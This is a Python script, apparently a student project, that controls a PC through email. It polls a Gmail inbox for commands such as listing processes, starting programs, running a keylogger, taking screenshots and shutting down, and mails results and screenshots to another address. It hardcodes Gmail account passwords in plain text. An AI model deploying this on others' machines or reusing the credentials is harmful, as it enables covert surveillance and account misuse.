import smtplib
import imaplib
import email
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.header import decode_header
import screenshot
import shutdown
from process_app import *
from keylogger import *

server = 'imap.gmail.com'
username_receiver = 'mangmaytinhremotecontrol@gmail.com'
password_receiver = 'lmlx vrwx cwym hvqz'
username_sender = "test.sender.pp@gmail.com"
password_sender = "mqre gihn qzct yulz"

imap = imaplib.IMAP4_SSL(host=server, port=993)

imap.login(username_receiver, password_receiver)

# Check mail and implement
smtp_server = 'smtp.gmail.com'  # SMTP server for Gmail
smtp_port = 587  # Port for TLS


def send_email(sender, receiver, subject, body, image_data=None):
    msg = MIMEMultipart()
    msg["From"] = sender
    msg["To"] = receiver
    msg["Subject"] = subject
    msg.attach(MIMEText(body, "plain"))
    if image_data is not None:
        image = MIMEImage(image_data, name="image.png")
        msg.attach(image)
    text = msg.as_string()
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(username_receiver, password_receiver)
    server.sendmail(sender, receiver, text)
    server.quit()


def CheckAndDo(cmd):
    if (cmd == 'applications'):
        send_email(username_receiver, username_sender,
                   "List of applications:", execute_msg(cmd))
    elif (cmd == 'processes'):
        send_email(username_receiver, username_sender,
                   "List of processes:", execute_msg(cmd))
    elif ('Start' in cmd):
        send_email(username_receiver, username_sender,
                   "List of processes:", execute_msg(cmd))
    elif (cmd == 'keylogger'):
        # duration of keylogger
        print(get_key_log(cmd))
    elif (cmd == 'screenshot'):
        image_data = screenshot.screen_shot()
        send_email(username_receiver, username_sender,
                   "Screenshot Talen!", "See attachment: ", image_data)
    elif (cmd == 'shutdown'):
        send_email(username_receiver, username_sender,
                   "Shutting Down PC!", "PC is shutting down...")
        shutdown.shutdown()
    else:
        print(cmd)


# Select unseen message in Inbox to read
cnt = 0
cmd = 'start'
while cmd != 'quit':
    imap.select("Inbox")
    res, mailIds = imap.search(None, '(UNSEEN)')
    print(res)

    # Try to read email
    for id in mailIds[0].decode().split():
        res, mailData = imap.fetch(id, '(RFC822)')
        message = email.message_from_string(mailData[0][1].decode())

        # Get message
        for part in message.walk():
            if (part.get_content_type() == 'text/plain'):
                cmd = part.as_string().splitlines()[-1]
                CheckAndDo(cmd)

    imap.close()

    time.sleep(0.4)

print("Byee")

imap.logout()
